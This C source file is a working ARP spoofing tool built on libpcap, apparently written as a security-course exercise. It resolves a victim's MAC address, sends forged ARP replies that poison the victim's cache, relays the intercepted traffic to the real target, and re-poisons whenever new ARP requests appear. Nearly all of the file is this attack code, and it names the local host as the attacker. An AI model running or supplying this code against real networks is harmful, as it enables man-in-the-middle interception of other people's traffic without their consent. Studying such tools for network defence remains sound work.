#include "arp_spoof.h"

/* Ref: https://stackoverflow.com/questions/1779715/how-to-get-mac-address-of-your-machine-using-a-c-program */
int GetLocalMac(char* dev, struct ether_addr* LocalMac){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, dev);
    if (ioctl(fd, SIOCGIFHWADDR, &s) == 0) {
        memcpy(LocalMac, s.ifr_addr.sa_data, ETHER_ADDR_LEN);
        return EXIT_SUCCESS;
    }
    return EXIT_FAILURE;
}

/* Ref: https://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux */
int GetLocalIP(char* dev, struct in_addr* LocalIP){
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    /* I want to get an IPv4 IP address */
    ifr.ifr_addr.sa_family = AF_INET;
    /* I want IP address attached to "eth0" */
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    /* display result */
    memcpy(LocalIP, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, IP_ADDRLEN);

    return EXIT_SUCCESS;
}

int GetMac(char* LogFilePath, pcap_t* handle, struct ether_addr LocalMac, struct in_addr LocalIP, struct in_addr SenderIP, struct ether_addr* SMac){
    struct ether_addr BroadcastMac;
    struct ether_addr UnknownMac;
    char *Genpacket = (char *)malloc(ETHER_MAX_LEN);
    uint32_t size;
    int32_t res;
    struct pcap_pkthdr* pheader;
    struct ether_header* peth_hdr;
    struct arphdr* parp_hdr;
    struct arp_addr* parp_addr;
    const u_char *packet;
    /* broadcast request packet */
    LOG(LogFilePath, "Generate Request packet to ask who is %s\n",inet_ntoa(SenderIP));

    memcpy(&BroadcastMac, "\xFF\xFF\xFF\xFF\xFF\xFF",ETHER_ADDR_LEN);
    memcpy(&UnknownMac, "\x00\x00\x00\x00\x00\x00",ETHER_ADDR_LEN);
    if(GenArpPacket(BroadcastMac, LocalMac, ARPOP_REQUEST, LocalIP, LocalMac, SenderIP, UnknownMac, &Genpacket, &size) != EXIT_SUCCESS){
        return EXIT_FAILURE;
    }
    if(pcap_sendpacket(handle, (const u_char *)Genpacket, size)){
        return EXIT_FAILURE;
    }

    /* parsing sniffed packet */
    while((res = pcap_next_ex(handle, &pheader, &packet)) >= 0){
        /* time out */
        if(res == 0){
            if(pcap_sendpacket(handle, (const u_char *)Genpacket, size)){   // probably packet lost
                return EXIT_FAILURE;
            }
            continue;
        }
        peth_hdr = (struct ether_header*) packet;

        if(peth_hdr->ether_type == htons(ETHERTYPE_ARP) &&
                !memcmp(peth_hdr->ether_dhost, &LocalMac,ETHER_ADDR_LEN)){

            parp_hdr = (struct arphdr*) (packet + sizeof(struct ether_header));

            if(parp_hdr->ar_hrd == htons(ARPHRD_ETHER) &&
                    parp_hdr->ar_pro == htons(ETHERTYPE_IP) &&
                    parp_hdr->ar_hln == ETHER_ADDR_LEN &&
                    parp_hdr->ar_pln == IP_ADDRLEN &&
                    parp_hdr->ar_op == htons(ARPOP_REPLY)){

                parp_addr = (struct arp_addr*)(packet + sizeof(struct ether_header) + sizeof(struct arphdr));
                if(!memcmp(&parp_addr->SenderIP, &SenderIP, IP_ADDRLEN) &&
                        !memcmp(&parp_addr->TargetMac, &LocalMac, ETHER_ADDR_LEN) &&
                        !memcmp(&parp_addr->TargetIP, &LocalIP,IP_ADDRLEN)){
                    memcpy(SMac, &parp_addr->SenderMac, ETHER_ADDR_LEN);
                    break;
                }
            }
        }
    }

    free(Genpacket);
    return EXIT_SUCCESS;
}

int GenArpPacket(struct ether_addr DMac, struct ether_addr SMac, uint16_t OpCode, struct in_addr SenderIP,struct ether_addr SenderMac, struct in_addr TargetIP, struct ether_addr TargetMac, char** packet, uint32_t* size){
    struct ether_header eth_hdr;
    struct arphdr arp_hdr;
    struct arp_addr arp_addr;

    memcpy(eth_hdr.ether_dhost, &DMac, ETH_ALEN);
    memcpy(eth_hdr.ether_shost, &SMac, ETH_ALEN);
    eth_hdr.ether_type = htons(ETHERTYPE_ARP);

    arp_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_hdr.ar_hln = ETHER_ADDR_LEN;
    arp_hdr.ar_pln = IP_ADDRLEN;     /* is same with IP ADDR LEN */
    arp_hdr.ar_op = htons(OpCode);

    memcpy(&arp_addr.SenderMac, &SenderMac, ETHER_ADDR_LEN);
    memcpy(&arp_addr.SenderIP, &SenderIP, IP_ADDRLEN);
    memcpy(&arp_addr.TargetMac, &TargetMac, ETHER_ADDR_LEN);
    memcpy(&arp_addr.TargetIP, &TargetIP, IP_ADDRLEN);

    *size = sizeof(struct ether_header) + sizeof(struct arphdr) + sizeof(struct arp_addr);

    memcpy(*packet, &eth_hdr, sizeof(struct ether_header));
    memcpy(*packet + sizeof(struct ether_header), &arp_hdr, sizeof(struct arphdr));
    memcpy(*packet + sizeof(struct ether_header) + sizeof(struct arphdr), &arp_addr, sizeof(struct arp_addr));

    return EXIT_SUCCESS;
}

int AttackPacket(pcap_t* handle, struct ether_addr SenderMac, struct ether_addr LocalMac, struct in_addr TargetIP, struct in_addr SenderIP){
    char* Genpacket = (char *)malloc(ETHER_MAX_LEN);
    uint32_t size;
    GenArpPacket(SenderMac,LocalMac,ARPOP_REPLY,TargetIP,LocalMac,SenderIP,SenderMac,&Genpacket,&size);
    if(pcap_sendpacket(handle,(const u_char*)Genpacket,size)){
        return EXIT_FAILURE;
    }
    free(Genpacket);
    return EXIT_SUCCESS;
}


int ArpSpoof(char* LogFilePath, pcap_t* handle, struct ether_addr SenderMac, struct ether_addr LocalMac, struct in_addr TargetIP, struct ether_addr TargetMac, struct in_addr SenderIP){
    int32_t res;
    struct pcap_pkthdr* pheader;
    const u_char* packet;

    if(AttackPacket(handle, SenderMac, LocalMac, TargetIP, SenderIP) != EXIT_SUCCESS){
        return EXIT_FAILURE;
    }
    LOG(LogFilePath, "poisoning\n");

    while( (res = pcap_next_ex(handle, &pheader, &packet)) >= 0){
        /* time out */
        if(res == 0)
            continue;

        switch (CheckPacket(packet, SenderMac, LocalMac, SenderIP, TargetIP)){
            case 1: /* relay */
                LOG(LogFilePath, "relay\n");
                if(relay(LogFilePath, handle, packet, LocalMac, SenderMac, TargetMac, pheader->caplen) != EXIT_SUCCESS){
                    return EXIT_FAILURE;
                }
                break;
            case 2: /* poisoning */
                LOG(LogFilePath, "poisoning\n");
                if(AttackPacket(handle, SenderMac, LocalMac, TargetIP, SenderIP) != EXIT_SUCCESS){
                    return EXIT_FAILURE;
                }
                break;
        }
    }
    return EXIT_SUCCESS;
}


int CheckPacket(const u_char* packet, struct ether_addr shost, struct ether_addr LocalMac, struct in_addr sIp, struct in_addr dIp){
    struct ether_header* peth_hdr;
    struct arphdr* parp_hdr;
    struct arp_addr* parp_addr;

    peth_hdr = (struct ether_header*) packet;

    /* check is not from shost */
    if(memcmp(peth_hdr->ether_shost, &shost, ETHER_ADDR_LEN))
        return 0;

    /* check packet destination is me(attacker) */
    if(memcmp(peth_hdr->ether_dhost, &LocalMac, ETHER_ADDR_LEN))
        return 0;
    /* check is arp request */
    if(peth_hdr->ether_type == htons(ETHERTYPE_ARP)){

        parp_hdr = (struct arphdr*) (packet + sizeof(struct ether_header));

        if(parp_hdr->ar_hrd == htons(ARPHRD_ETHER) &&
                parp_hdr->ar_pro == htons(ETHERTYPE_IP) &&
                parp_hdr->ar_hln == ETHER_ADDR_LEN &&
                parp_hdr->ar_pln == IP_ADDRLEN &&
                parp_hdr->ar_op == htons(ARPOP_REQUEST)){

            /* poison when arp request broadcast */
            if(!memcmp(peth_hdr->ether_dhost, BROADCAST_MAC, ETHER_ADDR_LEN)){
                return 2;
            }

            parp_addr = (struct arp_addr*)(packet + sizeof(struct ether_header) + sizeof(struct arphdr));

            if(!memcmp(&parp_addr->SenderIP, &sIp, IP_ADDRLEN) &&
                    !memcmp(&parp_addr->TargetIP, &dIp, IP_ADDRLEN)){
                return 2;
            }
        }
    }
    return 1;
}

int relay(char* LogFilePath, pcap_t* handle, const u_char* packet, struct ether_addr LocalMac, struct ether_addr SenderMac, struct ether_addr TargetMac, uint32_t size){
    struct ether_header* peth_hdr;

    int i;
    peth_hdr = (struct ether_header*) packet;

    memcpy(peth_hdr->ether_shost, &LocalMac, ETHER_ADDR_LEN);
    memcpy(peth_hdr->ether_dhost, &TargetMac, ETHER_ADDR_LEN);

    if(pcap_sendpacket(handle, packet, size)){
        for(i=0;i<size;i++)
            LOG(LogFilePath, "%02x ", packet[i] & 0xff);
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

